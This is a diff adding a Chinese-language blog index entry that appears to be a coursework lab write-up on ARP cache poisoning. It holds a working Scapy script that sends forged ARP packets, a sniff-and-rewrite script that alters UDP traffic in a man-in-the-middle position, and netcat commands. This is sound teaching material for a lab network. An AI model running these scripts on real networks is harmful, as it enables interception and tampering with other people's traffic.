@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>ARP缓存中毒</title>
+      <link href="/2025/04/07/2025-4-8-arp/"/>
+      <url>/2025/04/07/2025-4-8-arp/</url>
+      
+        <content type="html"><![CDATA[<h3 id="一、实验要求"><a href="#一、实验要求" class="headerlink" title="一、实验要求"></a>一、实验要求</h3><p><img src="https://cloudsources.pages.dev/img/Websecrity/8-1.png" alt=""></p><p>网络拓扑结构如下<br><img src="https://cloudsources.pages.dev/img/Websecrity/8-2.png" alt=""></p><p>IP地址与MAC地址的对应关系如下<br><img src="https://cloudsources.pages.dev/img/Websecrity/8-3.png" alt=""></p><h3 id="二、实验过程"><a href="#二、实验过程" class="headerlink" title="二、实验过程"></a>二、实验过程</h3><h4 id="1-hostB启动nc服务器"><a href="#1-hostB启动nc服务器" class="headerlink" title="1.hostB启动nc服务器"></a>1.hostB启动nc服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lu 9090</span><br></pre></td></tr></table></figure><h4 id="2-hostA启动客户端连接nc服务器"><a href="#2-hostA启动客户端连接nc服务器" class="headerlink" title="2.hostA启动客户端连接nc服务器"></a>2.hostA启动客户端连接nc服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -u 192.168.60.1 9090</span><br></pre></td></tr></table></figure><h4 id="3-hostM运行ARP欺骗和嗅探-篡改脚本"><a href="#3-hostM运行ARP欺骗和嗅探-篡改脚本" class="headerlink" title="3.hostM运行ARP欺骗和嗅探/篡改脚本"></a>3.hostM运行ARP欺骗和嗅探/篡改脚本</h4><p>本示例将ARP欺骗和信息篡改两个程序分开执行，代码如下可供参考</p><ul><li><p><strong>ARP欺骗脚本 <code>apr1.py</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">p1 = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;, src=&quot;02:42:c0:a8:3c:03&quot;)/ARP(pdst=&quot;192.168.60.2&quot;, psrc=&quot;192.168.60.1&quot;)</span><br><span class="line">p2 = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;, src=&quot;02:42:c0:a8:3c:03&quot;)/ARP(pdst=&quot;192.168.60.1&quot;, psrc=&quot;192.168.60.2&quot;)</span><br><span class="line">while True:</span><br><span class="line">    sendp(p1) </span><br><span class="line">    sendp(p2)</span><br><span class="line">    time.sleep(0.5)</span><br></pre></td></tr></table></figure></li><li><p><strong>信息篡改脚本 <code>arp2.py</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line">    if pkt.haslayer(UDP) and pkt.haslayer(Raw):</span><br><span class="line">        newdata = pkt[Raw].load.replace(b&quot;123&quot;, b&quot;456&quot;)</span><br><span class="line">        newpkt = Ether(src=&quot;02:42:c0:a8:3c:03&quot;, dst=&quot;02:42:62:3b:7b:5d&quot;)/IP(src=pkt[IP].src, dst=pkt[IP].dst)/UDP   # 注意修改hostB的MAC地址(每个人不一样)</span><br><span class="line">        (sport=pkt[UDP].sport, dport=pkt[UDP].dport)/newdata</span><br><span class="line">        sendp(newpkt, iface=&quot;eth0&quot;)</span><br><span class="line"></span><br><span class="line">f = &#x27;udp and (ether src 02:42:c0:a8:3c:02 or ether src 02:42:62:3b:7b:5d)&#x27;  # 注意修改这里的hostB的MAC地址</span><br><span class="line">sniff(filter=f, prn=spoof_pkt)</span><br></pre></td></tr></table></figure></li></ul><h3 id="三、效果演示"><a href="#三、效果演示" class="headerlink" title="三、效果演示"></a>三、效果演示</h3><p><img src="https://cloudsources.pages.dev/img/Websecrity/8-4.png" alt=""><br><img src="https://cloudsources.pages.dev/img/Websecrity/8-5.png" alt=""><br><img src="https://cloudsources.pages.dev/img/Websecrity/8-6.png" alt=""><br><img src="https://cloudsources.pages.dev/img/Websecrity/8-7.png" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安综合实践 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> arp欺骗 </tag>
+            
+            <tag> 中间人攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Python爬取视频</title>
       <link href="/2025/04/03/2025-4-3-crawler/"/>
       <url>/2025/04/03/2025-4-3-crawler/</url>
